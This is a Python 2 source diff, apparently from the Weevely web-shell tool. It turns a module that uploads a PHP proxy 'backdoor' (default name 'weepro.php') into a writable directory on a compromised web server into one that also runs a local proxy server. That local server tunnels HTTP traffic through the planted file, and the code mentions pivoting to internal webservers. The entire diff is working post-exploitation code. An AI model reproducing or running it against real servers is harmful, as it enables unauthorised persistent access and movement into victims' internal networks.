@@ -4,25 +4,105 @@ Created on 20/set/2011
 @author: norby
 '''
 
-
 from core.module import Module, ModuleException
 from core.vector import VectorList, Vector as V
 from core.parameters import ParametersList, Parameter as P
+from core.http.request import agents
 import re
 
+import SocketServer
+import urllib
+import sys
+from threading import Thread
 
-classname = 'InstallProxy'
+from random import choice
+
+classname = 'Proxy'
+
+
+class ProxyHandler(SocketServer.StreamRequestHandler):
     
-class InstallProxy(Module):
+    allow_reuse_address = 1
 
-    params = ParametersList('Install proxy', [],
-                    P(arg='rdir', help='Remote directory or \'find\' automatically', default='find', pos=0),
-                    P(arg='rname', help='Remote file name', default='weepro.php', pos=1))
+    def __init__(self, request, client_address, server):
+        
+        self.proxies = {}
+        self.useragent = choice(agents)
+        self.phpproxy = server.rurl
+        
+        SocketServer.StreamRequestHandler.__init__(self, request, client_address,server)
+        
+        
+    def handle(self):
+        req, body, cl, req_len, read_len = '', 0, 0, 0, 4096
+        try:
+            while 1:
+                if not body:
+                    line = self.rfile.readline(read_len)
+                    if line == '':                                 
+                        # send it anyway..
+                        send_req(req)
+                        return
+                    #if line[0:17].lower() == 'proxy-connection:':
+                    #    req += "Connection: close\r\n"
+                    #    continue
+                    req += line
+                    if not cl:
+                        t = re.compile('^Content-Length: (\d+)', re.I).search(line)
+                        if t is not None:
+                            cl = int(t.group(1))
+                            continue
+                    if line == "\015\012" or line == "\012":
+                        if not cl:
+                            self.send_req(req)
+                            return
+                        else:
+                            body = 1
+                            read_len = cl
+                else:
+                    buf = self.rfile.read(read_len)
+                    req += buf
+                    req_len += len(buf)
+                    read_len = cl - req_len
+                    if req_len >= cl:
+                        self.send_req(req)
+                        return
+        except IOError:
+            return
+
+    def send_req(self, req):
+        #print req
+        if req == '':
+            return
+        ua = urllib.FancyURLopener(self.proxies)
+        ua.addheaders = [('User-Agent', self.useragent)]
+        r = ua.open(self.phpproxy, urllib.urlencode({'req': req}))
+        while 1:
+            c = r.read(2048)
+            if c == '': break
+            self.wfile.write(c)
+        self.wfile.close()
+
+
+
+
+
+
+    
+class Proxy(Module):
+
+    params = ParametersList('Run proxy through server', [],
+                    P(arg='lport', help='Local proxy port', default=8080, type=int),
+                    P(arg='background', help='Go to background', default=True, type=bool),
+                    P(arg='rurl', help='Skip install and run directly server through remote url'),
+                    P(arg='rdir', help='Install in remote directory, or \'find\' it automatically', default='find'),
+                    P(arg='rname', help='Install with remote file name', default='weepro.php')
+                    )
     
 
     def __get_backdoor(self):
         
-        backdoor_path = 'modules/net/external/proxy.php'
+        backdoor_path = 'modules/net/external/phpproxy.php'
 
         try:
             f = open(backdoor_path)
@@ -52,28 +132,45 @@ class InstallProxy(Module):
         return dir, url
         
     
-    def run_module(self, rdir, rname):
+    def __run_proxy_server(self, rurl, lport, lhost='127.0.0.1'):
+        
+        server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
+        server.rurl = rurl
+        print '[%s] Proxy server running on %s:%i via \'%s\'' % (self.name, lhost, lport, rurl)
+        server.serve_forever()
         
         
-        path = rdir
-        url = ''
+    def run_module(self, lport, background, rurl, rdir, rname):
 
-        if rdir == 'find':
-            path, url = self.__find_writable_dir()
-
-        path = path + rname
-        url = url + rname
-
-        if path and url:
+        if not rurl:
         
-            phpfile = self.__get_backdoor()
-            response = self.__upload_file_content(phpfile, path)
-        
-            if response:
-                self.mprint('[%s] Simple PHP proxy uploaded as \'%s\'\n[%s] Use proxy with URL %s?u=http://site.com\n[%s] also to pivoting to internal webservers' % (self.name, path, self.name, url, self.name))
-        
-            return
+            path = rdir
+            url = ''
     
-
-        raise ModuleException(self.name,  "No writable web directory to upload PHP proxy")
+            if rdir == 'find':
+                path, url = self.__find_writable_dir()
+    
+            path = path + rname
+            url = url + rname
+    
+            if path and url:
+            
+                phpfile = self.__get_backdoor()
+                response = self.__upload_file_content(phpfile, path)
+            
+                if response:
+                    rurl = url
+                    self.mprint('[%s] PHP proxy uploaded as \'%s\'' % (self.name, rurl))
         
+            if not rurl:
+                raise ModuleException(self.name,  "Error installing remote PHP proxy, check remote dir and file name")
+          
+        try:
+        
+           Thread(target=self.__run_proxy_server, args=(rurl, lport)).start()
+        
+        except Exception, errtxt:
+           print errtxt
+          
+        from time import sleep
+        sleep(100) 
